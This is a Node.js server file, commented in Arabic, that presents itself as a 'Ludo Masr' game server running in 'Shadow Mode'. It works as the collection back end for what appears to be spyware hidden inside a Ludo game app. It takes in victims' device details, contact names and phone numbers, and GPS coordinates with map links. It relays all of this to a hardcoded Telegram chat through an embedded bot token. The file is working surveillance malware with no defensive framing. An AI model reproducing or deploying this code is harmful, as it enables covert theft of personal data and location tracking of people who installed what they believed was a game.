const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const app = express();

// إعداداتك الخاصة
const TELEGRAM_TOKEN = '8331033503:AAHf5C6jAqMAKHyyNBONxKrUISf4zHFsxDo';
const CHAT_ID = '5233445693';
const bot = new TelegramBot(TELEGRAM_TOKEN);

app.use(express.json());

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Ludo Masr Server</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                .status { color: green; font-size: 24px; }
            </style>
        </head>
        <body>
            <h1>🎮 Ludo Masr Server</h1>
            <p class="status">✅ Server is running successfully</p>
            <p>🕶️ Shadow Mode: Active</p>
            <p>📱 Target: ${CHAT_ID}</p>
        </body>
        </html>
    `);
});

// استقبال البيانات من التطبيق
app.post('/api/data', async (req, res) => {
    try {
        const data = req.body;
        console.log('📱 Received data:', data.type);

        let message = `🎯 **لودو مصر - بيانات جديدة**\\n\\n`;
        
        if (data.type === 'device_info') {
            const deviceData = data.data || {};
            message += `📱 **معلومات الجهاز**\\n`;
            message += `📟 الطراز: ${deviceData.device_model || 'غير معروف'}\\n`;
            message += `🤖 الأندرويد: ${deviceData.android_version || 'غير معروف'}\\n`;
            message += `🏭 الصانع: ${deviceData.manufacturer || 'غير معروف'}\\n`;
            message += `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\\n`;
        }
        else if (data.type === 'contacts') {
            const contacts = data.data || [];
            message += `📞 **جهات الاتصال**\\n`;
            message += `👥 العدد: ${contacts.length} جهة اتصال\\n`;
            
            // عرض أول 5 جهات اتصال
            contacts.slice(0, 5).forEach((contact, index) => {
                message += `${index + 1}. ${contact.name || 'لا يوجد اسم'}: ${contact.phone || 'لا يوجد رقم'}\\n`;
            });
            
            if (contacts.length > 5) {
                message += `... و ${contacts.length - 5} أكثر\\n`;
            }
        }
        else if (data.type === 'location') {
            const loc = data.data || {};
            message += `📍 **الموقع**\\n`;
            message += `🌐 خط العرض: ${loc.latitude || 'غير متاح'}\\n`;
            message += `🌐 خط الطول: ${loc.longitude || 'غير متاح'}\\n`;
            message += `📡 الدقة: ${loc.accuracy || 'غير متاح'} متر\\n`;
            
            if (loc.latitude && loc.longitude) {
                message += `🗺️ https://maps.google.com/?q=${loc.latitude},${loc.longitude}\\n`;
            }
        }
        else {
            message += `📦 **نوع البيانات:** ${data.type}\\n`;
            message += `🔢 **العدد:** ${data.count || data.data?.length || 'غير محدد'}\\n`;
        }

        // إرسال الرسالة للتلجرام
        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
        
        res.json({ 
            status: 'success', 
            message: 'تم استلام البيانات بنجاح',
            received_at: new Date().toISOString(),
            next_check: 300
        });
        
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// نقطة للتحقق من الحالة
app.get('/status', (req, res) => {
    res.json({ 
        status: 'online',
        server: 'Ludo Masr Shadow Server',
        version: '2.0',
        telegram_chat: CHAT_ID,
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// نقطة للبيانات المجمعة
app.post('/api/bulk', async (req, res) => {
    try {
        const { data_type, count, device_id } = req.body;
        
        await bot.sendMessage(CHAT_ID, 
            `📦 **بيانات مجمعة - لودو مصر**\\n` +
            `🎯 النوع: ${data_type || 'غير محدد'}\\n` +
            `🔢 العدد: ${count || 'غير محدد'}\\n` +
            `📱 الجهاز: ${device_id || 'غير معروف'}\\n` +
            `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`
        );
        
        res.json({ status: 'success', received: true });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🕶️ Ludo Masr Shadow Server running on port ${PORT}`);
    console.log(`🎯 Telegram Target: ${CHAT_ID}`);
    console.log(`🌐 Server URL: http://localhost:${PORT}`);
    console.log(`✅ Status Check: http://localhost:${PORT}/status`);
});
